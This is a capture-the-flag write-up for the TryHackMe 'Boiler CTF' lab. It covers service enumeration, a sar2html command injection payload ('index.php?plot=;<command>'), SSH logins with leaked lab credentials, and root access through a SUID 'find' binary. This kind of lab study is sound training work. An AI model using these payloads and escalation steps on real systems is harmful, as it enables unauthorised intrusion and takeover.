# Boiler CTF

## 1. Introduction

### 1.1 Background

Boiler CTF is a TryHackMe machine focused on developing skills in **enumeration, web exploitation, and privilege escalation in Linux**.

The machine presents multiple attack vectors, including:

- Exposed services (FTP, HTTP, SSH)
- Vulnerable web applications
- Poor credential management
- Exploitable SUID binaries

It also includes multiple *rabbit holes* (false leads), requiring a methodical enumeration process.

### 1.2 Objectives

- Enumerate exposed services on the target machine  
- Identify vulnerabilities in web applications  
- Obtain initial access (foothold)  
- Escalate privileges to root  
- Obtain user and root flags  

---

## 2. Enumeration

### 2.1 Nmap

A full port scan is performed:

```bash
sudo nmap -p- -Pn -sS -n --min-rate 5000 -oN allports --open
```

Results:

```bash
21/tcp    open  ftp
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt
55007/tcp open  ssh
```

#### Analysis:

- **Port 21 (FTP)** → Allows anonymous login  
- **Port 80 (HTTP)** → Web application  
- **Port 55007 (SSH)** → Non-standard remote access  
- **Port 10000 (HTTP)** → Not relevant in this case  

### 2.2 FTP (Port 21)

Access is gained with anonymous user:

```bash
ftp $IP
```

The following file is found:

```bash
.info.txt
```

Content:

```
Whfg jnagrq gb frr vs lbh svaq vg...
```

It is identified as **ROT13 cipher**, which decodes to:

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

### 2.3 Web

We check:

```
http://$IP/robots.txt
```

Relevant content:

```
/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it
```

Many of these are **rabbit holes**, designed to distract.

### 2.4 Joomla Discovery

The following is identified:

```
/joomla
```

Fuzzing is performed:

```bash
gobuster dir -u http://$IP/joomla -w /usr/share/SecLists/... -x php,txt,html
```

Important results:

- `/administrator` → Login panel  
- `/configuration.php`  
- Non-standard directories (potentially interesting)  

### 2.5 Vulnerability Identification

It is detected that the server uses:

```
sar2html
```

Research shows it is vulnerable to **Command Injection (RCE)**.

---

## 3. Exploitation

### 3.1 Remote Command Execution (RCE in sar2html)

The vulnerable endpoint:

```
index.php?plot=
```

Payload:

```
http://<IP>/index.php?plot=;<command>
```

Example:

```
index.php?plot=;whoami
```

Works correctly → execution confirmed.

### 3.2 System Enumeration

Files are listed:

```
index.php?plot=;ls -la
```

`log.txt` is identified.

### 3.3 Credential Extraction

Inside `log.txt`, the following information is found:

- User: `basterd`  
- Password: `superduperp@$$`  

### 3.4 SSH Access

```
ssh basterd@$IP-p55007
```

Successful access.

---

## 4. Post-Exploitation

### 4.1 Lateral Movement: stoner user

Inside `basterd`'s home:

```bash
backup.sh
```

This file contains credentials for:

```bash
stoner:#superduperp@$$no1knows
```

They are reused for SSH access:

```bash
ssh stoner@$IP -p55007
```

### 4.2 User Flag

In:

```bash
~/.secret
```

The **user flag** is obtained.

### 4.3 Privilege Escalation via SUID

SUID binaries are enumerated:

```bash
find / -perm -4000 2>/dev/null
```

Found:

```bash
/usr/bin/find
```

Exploitable binary (GTFOBins)

### 4.5 Root

```bash
find . -exec whoami \;
```

Result:

```bash
root
```

Then:

```bash
find . -exec ls /root/ \;
```

Obtained:

```bash
root.txt
```
